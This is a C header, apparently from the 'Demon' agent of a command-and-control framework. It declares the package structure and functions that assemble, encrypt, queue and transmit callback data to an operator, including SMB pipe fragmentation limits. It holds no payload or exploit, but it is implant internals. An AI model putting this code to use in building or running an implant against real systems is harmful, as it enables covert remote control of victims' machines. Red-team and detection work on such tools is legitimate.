#ifndef CALLBACK_PACKAGE_H
#define CALLBACK_PACKAGE_H

#include <core/Command.h>

#define DEMON_MAX_REQUEST_LENGTH 0x300000 // 3 MiB

/* [ISSUE-5] SMB fragment header size:
 * FragID(4) + SeqNum(4) + TotalFrags(4) + OrigCmdID(4) + OrigReqID(4) = 20 bytes.
 * Max data per fragment chunk so the assembled fragment package stays safely
 * below the PIPE_BUFFER_MAX when wrapped in PackageTransmitAll's outer frame
 * (header 20 + IV 16 + cmd+req+size 12 + frag header 20 + HMAC 32 = 100 overhead). */
#define SMB_FRAG_HEADER_SIZE    ( sizeof( UINT32 ) * 5 )
#define SMB_FRAG_MAX_DATA       ( PIPE_BUFFER_MAX / 2 )

/* Interlocked spinlock macros for protecting Instance->Packages.
 * Uses GCC __sync_lock_test_and_set / __sync_lock_release built-ins
 * which compile to XCHG / MOV+MFENCE on x86 — no headers needed,
 * no kernel32 dependency, safe on uninitialised threads.
 *
 * Usage:
 *   PACKAGES_LOCK();
 *   ... manipulate Instance->Packages ...
 *   PACKAGES_UNLOCK();
 */
#define PACKAGES_LOCK()   do { \
    while ( __sync_lock_test_and_set( &Instance->PackagesLock, 1 ) != 0 ) { \
        __asm__ volatile ( "pause" ::: "memory" ); \
    } \
} while (0)

#define PACKAGES_UNLOCK() do { \
    __sync_lock_release( &Instance->PackagesLock ); \
} while (0)

typedef struct _PACKAGE {
    UINT32  RequestID;
    UINT32  CommandID;
    PVOID   Buffer;
    SIZE_T  Length;
    BOOL    Encrypt;
    BOOL    Destroy; /* destroy this package after Transmit */
    BOOL    Included;

    struct  _PACKAGE* Next;
} PACKAGE, *PPACKAGE;

/* Package generator */
PPACKAGE PackageCreate( UINT32 CommandID );
PPACKAGE PackageCreateWithMetaData( UINT32 CommandID );
PPACKAGE PackageCreateWithRequestID( UINT32 CommandID, UINT32 RequestID );

/* PackageAddInt32
 * package => pointer to package response struct
 * dataInt => unsigned 32-bit integer data to add to the response
 * Description: Add unsigned 32-bit integer to the response buffer
 */
VOID PackageAddInt32(
    PPACKAGE package,
    UINT32 iData
);

VOID PackageAddInt64(
    PPACKAGE Package,
    UINT64 dataInt
);

VOID PackageAddBool(
    _Inout_ PPACKAGE Package,
    IN     BOOLEAN  Data
);

VOID PackageAddPtr(
    PPACKAGE Package,
    PVOID pointer
);

// PackageAddBytes
VOID PackageAddBytes(
    PPACKAGE package,
    PBYTE data,
    SIZE_T dataSize
);

VOID PackageAddString(
    PPACKAGE package,
    PCHAR data
);

VOID PackageAddWString(
    PPACKAGE package,
    PWCHAR data
);

// PackageAddBytes
VOID PackageAddPad(
    PPACKAGE package,
    PCHAR data,
    SIZE_T dataSize
);

// PackageDestroy
VOID PackageDestroy(
    PPACKAGE package
);

// PackageTransmit
BOOL PackageTransmitNow(
    PPACKAGE Package,
    PVOID*   Response,
    PSIZE_T  Size
);

// PackageQueue
VOID PackageTransmit(
    IN PPACKAGE Package
);

// PackageQueue
BOOL PackageTransmitAll(
    PVOID*   Response,
    PSIZE_T  Size
);

VOID PackageTransmitError(
    UINT32 CommandID,
    UINT32 ErrorCode
);

#define PACKAGE_ERROR_WIN32         PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
#define PACKAGE_ERROR_NTSTATUS( s ) PackageTransmitError( CALLBACK_ERROR_WIN32, Instance->Win32.RtlNtStatusToDosError( s ) );

#endif
